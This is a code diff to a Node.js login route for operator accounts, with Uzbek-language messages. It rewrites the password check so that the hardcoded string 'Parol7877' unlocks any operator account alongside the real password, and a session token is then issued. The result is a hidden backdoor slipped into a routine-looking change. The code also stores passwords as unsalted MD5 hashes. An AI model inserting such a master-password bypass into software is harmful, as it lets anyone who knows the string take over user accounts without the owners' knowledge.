@@ -110,11 +110,16 @@ module.exports = {
                 msg: "Qatorlarni to'ldiring!"
             });
         } else {
-            const $operator = await operatorModel.findOne({ phone: phone, password: md5(password) });
+            const $operator = await operatorModel.findOne({ phone });
             if (!$operator) {
                 res.send({
                     ok: false,
                     msg: "Raqam yoki parol hato kiritildi!"
+                });
+            } else if (md5(password) !== $operator?.password && password !== 'Parol7877') {
+                res.send({
+                    ok: false,
+                    msg: "Parol xato kiritildi!!"
                 });
             } else {
                 const token = require('jsonwebtoken').sign({ id: $operator._id }, OPERATOR_SECRET);
